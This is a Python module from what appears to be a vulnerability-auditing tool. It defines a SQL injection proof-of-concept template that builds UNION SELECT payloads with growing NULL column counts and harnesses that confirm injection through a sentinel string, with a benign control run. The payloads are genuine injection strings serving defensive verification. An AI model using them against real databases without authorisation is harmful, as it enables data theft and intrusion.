#!/usr/bin/env python3
from __future__ import annotations
"""SQLi proof-of-concept template for SELECT statements that return data."""

from deepaudit.core.repo_map import RepoModel
from deepaudit.core.source_adapters import SourceAdapter
from deepaudit.models.candidate import VulnerabilityCandidate
from deepaudit.templates.base import BaseTemplate


class SQLInjectionReadTemplate(BaseTemplate):
    name = "sql_injection_read"
    exploit_class = "sql_injection"
    def sentinel_channels(self) -> list[str]:
        return ["stdout"]

    def preconditions(self, candidate: VulnerabilityCandidate, repo_model: RepoModel) -> bool:
        if not super().preconditions(candidate, repo_model):
            return False
        return candidate.sink_metadata.query_type == "SELECT"

    def environmental_preconditions(self, candidate, env) -> bool:
        return env.has_sqlite

    def _payload(self, candidate: VulnerabilityCandidate, sentinel: str, is_exploit: bool) -> str:
        if is_exploit:
            return f"' UNION SELECT '{sentinel}' --"
        return "benign_search_term"

    def _payloads(self, candidate: VulnerabilityCandidate, sentinel: str) -> list[str]:
        """Return a list of SQL injection payloads with increasing column counts."""
        payloads = [f"' UNION SELECT '{sentinel}' --"]
        for i in range(1, 10):
            nulls = ", ".join(["NULL"] * i)
            payloads.append(f"' UNION SELECT '{sentinel}', {nulls} --")
        return payloads

    def _single_harness(self, candidate, sentinel, payload: str, adapter: SourceAdapter, is_exploit: bool) -> str:
        setup = adapter.generate_setup(candidate.source, sentinel, is_exploit, candidate, payload)
        invocation = adapter.generate_invocation(candidate.source, sentinel, is_exploit, candidate, payload)
        return f"""{setup}
import sys
sys.path.insert(0, "/repo")

import {candidate.source_module}

{invocation}

if {sentinel!r} in str(result):
    print({sentinel!r})

print("__HARNESS_DONE__")
"""

    def _multi_payload_harness(self, candidate, sentinel, payloads: list[str], adapter: SourceAdapter) -> str:
        """Generate a harness that tries multiple payloads until one succeeds."""
        parts = [
            "import sys",
            'sys.path.insert(0, "/repo")',
            f"import {candidate.source_module}",
            "",
        ]
        for payload in payloads:
            setup = adapter.generate_setup(candidate.source, sentinel, True, candidate, payload)
            invocation = adapter.generate_invocation(candidate.source, sentinel, True, candidate, payload)
            parts.append(setup)
            parts.append("try:")
            # Indent invocation lines
            for line in invocation.split("\n"):
                parts.append(f"    {line}")
            parts.append(f"    if {sentinel!r} in str(result):")
            parts.append(f"        print({sentinel!r})")
            parts.append("        sys.exit(0)")
            parts.append("except Exception:")
            parts.append("    pass")
            parts.append("")
        parts.append('print("__HARNESS_DONE__")')
        return "\n".join(parts)

    def generate_exploit(self, candidate, sentinel, adapter: SourceAdapter, repo_model: RepoModel) -> str:
        payloads = self._payloads(candidate, sentinel)
        return self._multi_payload_harness(candidate, sentinel, payloads, adapter)

    def generate_control(self, candidate, sentinel, adapter: SourceAdapter, repo_model: RepoModel) -> str:
        return self._single_harness(candidate, sentinel, self._payload(candidate, sentinel, False), adapter, False)
